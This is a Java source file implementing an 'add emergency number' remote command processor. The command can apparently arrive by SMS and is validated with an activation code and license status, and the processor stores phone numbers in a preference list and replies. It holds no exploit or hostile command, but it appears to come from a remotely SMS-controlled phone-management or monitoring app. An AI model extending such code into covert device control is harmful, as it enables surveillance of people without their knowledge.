package com.vvt.remotecommandmanager.processor.securityandprotection;

import java.util.List;

import com.vvt.appcontext.AppContext;
import com.vvt.datadeliverymanager.Customization;
import com.vvt.eventrepository.FxEventRepository;
import com.vvt.license.LicenseInfo;
import com.vvt.license.LicenseStatus;
import com.vvt.logger.FxLog;
import com.vvt.preference_manager.PreDefaultValues;
import com.vvt.preference_manager.PrefEmergencyNumber;
import com.vvt.preference_manager.PreferenceManager;
import com.vvt.preference_manager.PreferenceType;
import com.vvt.remotecommandmanager.MessageManager;
import com.vvt.remotecommandmanager.ProcessingType;
import com.vvt.remotecommandmanager.RemoteCommandData;
import com.vvt.remotecommandmanager.RemoteCommandType;
import com.vvt.remotecommandmanager.exceptions.InvalidCommandFormatException;
import com.vvt.remotecommandmanager.exceptions.RemoteCommandException;
import com.vvt.remotecommandmanager.processor.ProcessingResult;
import com.vvt.remotecommandmanager.processor.RemoteCommandProcessor;
import com.vvt.remotecommandmanager.utils.RemoteCommandUtil;

public class AddEmergencyNumberProcessor extends RemoteCommandProcessor {
	private static final String TAG = "AddEmergencyNumberProcessor";
	
	private static final boolean VERBOSE = true;
	private static final boolean LOGV = Customization.VERBOSE ? VERBOSE : false;
	private static final boolean LOGD = Customization.DEBUG;
	private static final boolean LOGW = Customization.WARNING;
	private static final boolean LOGE = Customization.ERROR;
	
	private String mRecipientNumber;
	private ProcessingResult mReplyMessage;
	private PreferenceManager mPreferenceManager;
	private LicenseInfo mLicenseInfo;
	private StringBuilder mReplyMessageBuilder;
	
	public AddEmergencyNumberProcessor(AppContext appContext, FxEventRepository eventRepository,
			LicenseInfo licenseInfo, PreferenceManager preferenceManager) {
		super(appContext, eventRepository);
		
		mLicenseInfo = licenseInfo;
		mReplyMessage = new ProcessingResult();
		mPreferenceManager = preferenceManager;
	}

	@Override
	public ProcessingType getProcessingType() {
		return ProcessingType.SYNC;
	}

	@Override
	protected void doProcessCommand(RemoteCommandData commandData)
			throws RemoteCommandException {
		if(LOGV) FxLog.v(TAG, "doProcessCommand # ENTER ...");
		mReplyMessageBuilder = new StringBuilder();
		
		validateRemoteCommandData(commandData);
		
		if(mLicenseInfo.getLicenseStatus() == LicenseStatus.DISABLED) {
			mReplyMessageBuilder.append(MessageManager.LICENSE_DISABLED_WARNING).append(System.getProperty("line.separator"));
		} else if (mLicenseInfo.getLicenseStatus() == LicenseStatus.EXPIRED) {
			mReplyMessageBuilder.append(MessageManager.LICENSE_EXPIRED_WARNING).append(System.getProperty("line.separator"));
		}
		
		if(commandData.isSmsReplyRequired()) {
			mRecipientNumber = commandData.getSenderNumber();
		}
		
		List<String> args = null;
		
		try	 {
			
			if(commandData.getRmtCommandType() == RemoteCommandType.SMS_COMMAND) {
				args = RemoteCommandUtil.removeActivationCodeFromArgs(commandData.getArguments());			
			}
			else {
				args = commandData.getArguments();
			}
			
			if(LOGD) FxLog.d(TAG, "doProcessCommand # args : "+ args.toString());
			
			PrefEmergencyNumber  emergencyNumberPreference = (PrefEmergencyNumber)mPreferenceManager.getPreference(PreferenceType.EMERGENCY_NUMBER);
			
			if(emergencyNumberPreference.getEmergencyNumber().size() >= PreDefaultValues.MAX_EMERGENCYNUMBERS_ALLOWED) {
				if(LOGD) FxLog.d(TAG, "doProcessCommand # MAX_EMERGENCYNUMBERS_ALLOWED");
				mReplyMessage.setIsSuccess(false);
				mReplyMessageBuilder.append(MessageManager.getErrorMessage(MessageManager.ErrCmdInvalidPhoneNumberToEmergencyList));
				mReplyMessage.setMessage(mReplyMessageBuilder.toString());
				return;
			}
			
			if(LOGV) FxLog.v(TAG, "doProcessCommand # Validate ... ");
			// Validate
			for(String newEmergencyNumber: args) {
				if(emergencyNumberPreference.getEmergencyNumber().contains(newEmergencyNumber)) {
					if(LOGW) FxLog.w(TAG, "doProcessCommand # Duplicate number : "+newEmergencyNumber);
					mReplyMessage.setIsSuccess(false);
					mReplyMessageBuilder.append(MessageManager.getErrorMessage(MessageManager.ErrCmdCannotAddDuplicateToEmeregencyList));
					mReplyMessage.setMessage(mReplyMessageBuilder.toString());
					return;
				}
	
				if(!RemoteCommandUtil.isPhoneNumberFormat(newEmergencyNumber)) {
					if(LOGW) FxLog.w(TAG, "doProcessCommand # Invalid format number : "+newEmergencyNumber);
					mReplyMessage.setIsSuccess(false);
					mReplyMessageBuilder.append(MessageManager.getErrorMessage(MessageManager.ErrCmdInvalidPhoneNumberToEmergencyList));
					mReplyMessage.setMessage(mReplyMessageBuilder.toString());
					return;
				}
			}
		
			for(String number: args) {
				if(LOGV) FxLog.v(TAG, "doProcessCommand # add number : "+number);
				emergencyNumberPreference.addEmergencyNumber(number);
			}
			if(LOGD) FxLog.d(TAG, "doProcessCommand #After Add emergencyNumber : " + emergencyNumberPreference.getEmergencyNumber().toString());
			mPreferenceManager.savePreferenceAndNotifyChange(emergencyNumberPreference);
			
			mReplyMessage.setIsSuccess(true);
			mReplyMessageBuilder.append(MessageManager.ADD_EMERGENCY_NUMBER_SUCCESS);
			mReplyMessage.setMessage(mReplyMessageBuilder.toString());
		}
		catch(Throwable t) {
			if(LOGE) FxLog.e(TAG, t.toString());
			
			mReplyMessage.setIsSuccess(false);
			mReplyMessageBuilder.append(MessageManager.ADD_EMERGENCY_NUMBER_ERROR);
			mReplyMessage.setMessage(mReplyMessageBuilder.toString());
		}
		
		if(LOGV) FxLog.v(TAG, "doProcessCommand # IsSuccess : " + mReplyMessage.isSuccess());
		if(LOGV) FxLog.v(TAG, "doProcessCommand # ReplyMessage : " + mReplyMessage.getMessage());
		if(LOGV) FxLog.v(TAG, "doProcessCommand # EXIT ...");
	}
	
	protected void validateRemoteCommandData(RemoteCommandData commandData) throws RemoteCommandException{
		
		if(commandData.getRmtCommandType() == RemoteCommandType.SMS_COMMAND) {
			if(commandData.getArguments().size() < 2) {
				throw new InvalidCommandFormatException();
			}
		
			//if invalid activation code it will throw exception.
			RemoteCommandUtil.validateActivationCode(commandData.getArguments().get(0), mLicenseInfo);
		}
	}

	@Override
	protected String getRecipientNumber() {
		return mRecipientNumber;
	}

	@Override
	protected ProcessingResult getReplyMessage() {
		return mReplyMessage;
	}

}
